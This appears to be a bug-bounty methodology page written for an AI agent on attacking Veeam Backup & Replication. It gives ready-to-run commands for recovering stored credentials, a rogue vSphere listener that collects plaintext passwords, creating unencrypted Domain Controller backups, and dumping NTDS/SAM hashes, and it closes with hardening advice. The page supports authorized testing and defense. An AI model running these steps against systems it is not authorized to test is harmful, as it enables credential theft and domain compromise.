---
technology: "Veeam Backup & Replication"
kind: bug-bounty-methodology
audience: ai-agent
status: upstream-only
family: backup
version: "1.0"
provenance: "upstream-only; zero corpus evidence by design (owner-approved bucket-2 new-unit wave 2026-11-13) — KB4424/KB4581 gates, VeeamThief/VHDVomit/NetExec-module usage per their upstream repos/readmes, Extract Utility per helpcenter.veeam.com + rewritten from HackTricks (src/network-services-pentesting/pentesting-veeam-backup-and-replication.md), CC BY-NC 4.0, accessed 2026-11-13"
---

# Veeam Backup & Replication bug-bounty methodology

Companion overview: [[veeam]].

Scope: backup-server fingerprinting, the stored-credential store (on-box and over the network), console credential-oracle tricks, unencrypted-backup job creation, offline extraction of exposed backups to domain material, and recovery-destruction testing. Related: [[smb]], [[ntlm]], [[mssql]], [[ntds]], [[windows-secrets]].

## Phase 0 — Tooling

**NetExec** (with its `veeam` module) for SMB-side credential recovery. **VeeamThief** (rogue-vSphere listener for v12+) or the original veeampot-lineage `veeam-creds` tooling. **Veeam Extract Utility** (`extract.exe` / Linux build) for standalone `.vbk` restoration. **VHDVomit** for automated disk-image triage. **impacket-secretsdump** for the offline NTDS/SAM work. All commands below assume explicitly authorized targets — recovery data is production data.

## Phase 1 — Fingerprint the backup tier

```bash
nmap -sV -p 9392,9400,9401,9419 198.51.100.20
# 9401 = Veeam.Backup.Service (config-DB service; CVE-2023-27532 surface)
```

Correlate the listener with the installed product **and patch** metadata — an open 9401 alone is a candidate signal, not a finding. If Veeam Backup Enterprise Manager is present, enumerate it separately: KB4581 (CVE-2024-29849–29852, May 2024) is an Enterprise Manager advisory set, not a VBR-core one. For the network primitive itself, CVE-2023-27532 (KB4424): **all** VBR versions before the March 2023 builds let an unauthenticated user inside the backup-network perimeter request the encrypted credential rows from the configuration database through that service — patch floors are per-KB4424 build numbers (ISOs dated 2023-02-23 for v12 and 2023-02-27 for 11a onward are not vulnerable). Note the KB's own correction: the CVE was first published as CVE-2023-27530 — the -27532 ID is authoritative. Recovered rows are encrypted; treat them as confirmation of the store and its account list, and as one more reason to get on the box.

## Phase 2 — Stored credentials from the backup server

With administrative SMB access, NetExec's `veeam` module does the full chain — registry check, MS SQL **and** PostgreSQL layouts (v11/v12), recovery script — in one command:

```bash
nxc smb 198.51.100.20 -u localadmin -p 'PASSWORD' -M veeam
```

Every recovered credential is a separate trust path: map which is a vCenter admin, which is a guest-VM local admin, which is a domain account. **Backup credentials should never resolve to Domain Admin or equivalent** — if one does, the finding writes itself: backup-host compromise is domain compromise. Manual on-box equivalent: locate the configuration database (`VeeamBackup`), read the `Credentials` rows, and decrypt with the on-server DPAPI context — the service must be able to do exactly that to run its jobs.

## Phase 3 — Console credential oracle (rogue vSphere)

With console/administrative access, make Veeam hand you a stored plaintext itself (VeeamThief implements the v12+ `RetrieveInternalContent` responses the client expects):

```bash
sudo python3 VeeamThief.py -p 8443   # rogue vSphere endpoint on the listener
```

Then in the console: **Backup Infrastructure → Add Server → VMware vSphere**, point it at `198.51.100.10:8443`, accept the test-certificate prompt, and pick the target entry from the Credential Manager. Veeam runs its SOAP authentication flow against your listener and transmits the selected username and plaintext password. This is intended secret use — no DPAPI break — and it defeats "the store is encrypted" as a mitigation.

## Phase 4 — Manufacture an unencrypted backup

When you control job creation, encryption on old restore points is irrelevant: select a stored privileged credential, create a new job for a sensitive machine (a Domain Controller is the canonical choice), disable encryption for that job, run it, and copy the fresh `.vbk` for offline work. Report the detection angle: alert when any job is created with encryption disabled or flips its encryption setting.

## Phase 5 — Exposed backups and offline extraction

Test anonymous, guest, and low-privilege access on repository shares; collect the artifacts:

```bash
find /mnt/backups -type f \
  \( -iname '*.vbk' -o -iname '*.vbm' -o -iname '*.vib' \
     -o -iname '*.vhd' -o -iname '*.vhdx' -o -iname '*.vmdk' \)
```

Standalone restore with the Extract Utility (no Veeam server needed; encrypted files require that job's password):

```powershell
extract.exe "Z:\Backups\DC01\DC01.vbk"
extract.exe -password 'BACKUP_PASSWORD' "Z:\Backups\DC01\DC01.vbk"
```

From a restored DC image, work offline — never against the live host: `Windows\NTDS\ntds.dit` plus the `SYSTEM` hive (member servers: `SAM` + `SYSTEM`):

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Automated triage of image trees with VHDVomit (mounts via qemu-nbd, harvests Windows credential artifacts; remote mode does password auth, not pass-the-hash):

```bash
sudo python3 vhdvomit.py -t 198.51.100.30                      # null session
sudo python3 vhdvomit.py -t 198.51.100.30 -u svc -p 'PASSWORD' -d corp
sudo python3 vhdvomit.py --local-path /mnt/backups/DC01.vhdx
```

## Phase 6 — Recovery destruction (last, and only by scope)

The same access that extracts secrets can disable jobs and delete, alter, or encrypt restore points — the ransomware playbook end-state. On an authorized engagement this is at most a **demonstrated ability to reach the delete path, non-destructively**; validate immutability claims with an explicitly authorized, read-only check rather than touching real recovery data. Report: which restore paths survive management-plane compromise, and whether the immutability window actually holds.

## Hardening signals to report (from Veeam's own guidance)

Backup infrastructure in a separate workgroup or management forest on a separate network; hardened repositories; console MFA; dedicated least-privilege backup accounts (never Domain Admin in the credential manager); job encryption mandatory with recovery passwords stored off the backup server; alerts on new vSphere endpoints (literal IPs, odd ports like 8443), on privileged credential-manager entries used by new jobs, and on mass rename/delete of restore points; LAPS for local admins; SMB/LDAP signing and channel binding; HTTPS WSUS; at least one immutable copy tested against backup-admin compromise.
